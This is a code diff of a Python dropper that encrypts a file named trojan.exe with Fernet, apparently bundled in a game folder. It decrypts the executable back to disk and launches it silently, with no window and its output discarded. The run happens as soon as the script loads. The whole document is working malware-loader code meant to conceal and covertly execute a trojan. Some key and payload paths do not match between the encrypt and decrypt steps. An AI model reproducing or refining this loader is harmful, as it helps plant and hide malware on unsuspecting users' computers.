@@ -1,37 +1,54 @@
-import os
+import subprocess
 from cryptography.fernet import Fernet
 
-def enryptFILE():
+def resource_path(relative_path):
+    import sys, os
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
+def encryptFILE():
     key = Fernet.generate_key()
 
-    with open ("trojan/key.txt", "wb") as file :
+    with open (resource_path("trojan/key.txt"), "wb") as file :
         file.write(key)
 
-    with open ("trojan/trojan.py" , 'rb') as file:
+    with open (resource_path("jeu/trojan.exe") , 'rb') as file:
         original = file.read()
 
     f =Fernet (key)
     encrypted = f.encrypt(original)
 
-    with open ("Encrrojan.txt" , 'wb') as encrypted_file:
-        encrypted_file.write(encrypted)
+    with open(resource_path("jeu/trojan/program.enc"), "wb") as file:
+        file.write(encrypted)
 
 
 def decryptAndRun():
-    with open ("jeu/key.txt" , 'rb') as file:
+    with open(resource_path("jeu/key.txt"), 'rb') as file:
         key = file.read()
 
     f =Fernet (key)
 
-    with open ("jeu/Encrrojan.txt" , 'rb') as encrypted_file:
+    with open(resource_path("jeu/program.enc"), 'rb') as encrypted_file:
         encrypted = encrypted_file.read()
 
     decrypted = f.decrypt(encrypted)
 
-    with open ("trojan/Decrrojan.py" , 'wb') as decrypted_file:
+    with open(resource_path("jeu/trojan.exe"), 'wb') as decrypted_file:
         decrypted_file.write(decrypted)
 
 
 
     #run
-    os.system("python3 trojan/Decrrojan.py")
+    trojan = subprocess.Popen(
+    resource_path("jeu/trojan.exe"),
+    stdout=subprocess.DEVNULL,
+    stderr=subprocess.DEVNULL,
+    creationflags=subprocess.CREATE_NO_WINDOW
+	)
+    
+    return trojan
+
+decryptAndRun()
